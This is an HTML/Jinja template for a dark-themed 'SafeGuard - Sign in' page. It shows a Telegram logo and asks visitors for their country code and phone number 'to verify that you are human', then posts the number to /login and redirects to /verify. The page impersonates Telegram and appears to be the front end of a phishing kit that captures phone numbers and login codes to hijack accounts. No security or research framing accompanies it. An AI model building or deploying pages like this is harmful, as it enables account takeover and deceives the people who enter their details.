{% extends "base.html" %}

{% block title %}SafeGuard - Sign in{% endblock %}

{% block content %}
<style>
    body {
        background: #181A20;
        color: #fff;
    }
    .login-card {
        background: #23243a;
        max-width: 380px;
        margin: 48px auto 0 auto;
        border-radius: 24px;
        box-shadow: 0 4px 32px 0 #00000040;
        padding: 36px 32px 32px 32px;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    .logo-crop {
        width: 96px;
        height: 96px;
        border-radius: 50%;
        overflow: hidden;
        background: #2d284d;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 24px;
        box-shadow: 0 2px 16px 0 #9B6EF340;
    }
    .logo-crop img {
        width: 90px;
        height: 90px;
        object-fit: cover;
        border-radius: 50%;
    }
    .login-title {
        font-size: 1.5rem;
        font-weight: 700;
        margin-bottom: 8px;
        text-align: center;
    }
    .login-subtitle {
        font-size: 1rem;
        color: #b0b3c6;
        margin-bottom: 28px;
        text-align: center;
    }
    .form-group {
        width: 100%;
        margin-bottom: 18px;
    }
    .form-label {
        font-size: 0.98rem;
        margin-bottom: 6px;
        color: #b0b3c6;
        display: block;
    }
    .form-select, .form-input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 10px;
        border: none;
        background: #181A20;
        color: #fff;
        font-size: 1rem;
        margin-bottom: 0;
        outline: none;
    }
    .form-select {
        margin-bottom: 12px;
    }
    .checkbox-row {
        display: flex;
        align-items: center;
        margin-bottom: 22px;
        width: 100%;
    }
    .checkbox-row input[type="checkbox"] {
        accent-color: #9B6EF3;
        width: 18px;
        height: 18px;
        margin-right: 10px;
    }
    .checkbox-row label {
        color: #b0b3c6;
        font-size: 1rem;
        cursor: pointer;
    }
    .btn-purple {
        width: 100%;
        background: #9B6EF3;
        color: #fff;
        border: none;
        border-radius: 12px;
        padding: 14px 0;
        font-size: 1.1rem;
        font-weight: 600;
        margin-bottom: 12px;
        cursor: pointer;
        transition: background 0.2s;
    }
    .btn-purple:active, .btn-purple:focus {
        background: #7a4de0;
    }
    .qr-link {
        display: block;
        text-align: center;
        color: #9B6EF3;
        font-size: 1rem;
        margin-top: 8px;
        text-decoration: none;
        font-weight: 500;
        letter-spacing: 0.5px;
    }
    .qr-link:hover {
        text-decoration: underline;
    }
</style>
<div class="login-card">
    <div class="logo-crop">
        <img src="{{ url_for('static', filename='tg-logo.jpg') }}" alt="Telegram Logo">
    </div>
    <div class="login-title">SafeGuard - Sign in</div>
    <div class="login-subtitle">
        Please confirm your country code<br>and enter your phone number, in order to verify that you are human.
</div>
    <form id="loginForm" style="width:100%;">
    <div class="form-group">
            <label class="form-label" for="country">Country</label>
            <select id="country" class="form-select" required>
                <option value="United States" data-code="+1">United States</option>
                <option value="United Kingdom" data-code="+44">United Kingdom</option>
                <option value="Nigeria" data-code="+234" selected>Nigeria</option>
                <option value="Ghana" data-code="+233">Ghana</option>
                <option value="Kenya" data-code="+254">Kenya</option>
                <option value="South Africa" data-code="+27">South Africa</option>
                <!-- Add more as needed -->
            </select>
        </div>
        <div class="form-group">
            <label class="form-label" for="phone">Phone Number</label>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="countryCode" style="background:#23243a;padding:10px 12px;border-radius:8px;font-size:1rem;min-width:54px;">+234</span>
                <input type="tel" id="phone" class="form-input" placeholder="--- --- ----" required autocomplete="tel">
            </div>
        </div>
        <div class="checkbox-row">
            <input type="checkbox" id="keepSignedIn" checked>
            <label for="keepSignedIn">Keep me signed in</label>
    </div>
        <button type="submit" class="btn-purple" id="submitBtn">NEXT</button>
</form>
</div>
{% endblock %}

{% block scripts %}
<script>
// Update country code when country changes
const countrySelect = document.getElementById('country');
const countryCodeSpan = document.getElementById('countryCode');
countrySelect.addEventListener('change', function() {
    const selected = countrySelect.options[countrySelect.selectedIndex];
    countryCodeSpan.textContent = selected.getAttribute('data-code');
});

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const phone = document.getElementById('phone').value.replace(/\D/g, '');
    const countryCode = countryCodeSpan.textContent;
    const fullPhone = countryCode + phone;
    if (!phone) {
        alert('Please enter your phone number');
        return;
    }
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Sending...';
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone_number: fullPhone })
        });
        const data = await response.json();
        if (data.success) {
            setTimeout(() => { window.location.href = '/verify'; }, 1200);
        } else {
            alert(data.error || 'Something went wrong');
        }
    } catch (error) {
        alert('Network error. Please try again.');
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'NEXT';
    }
});
</script>
{% endblock %}
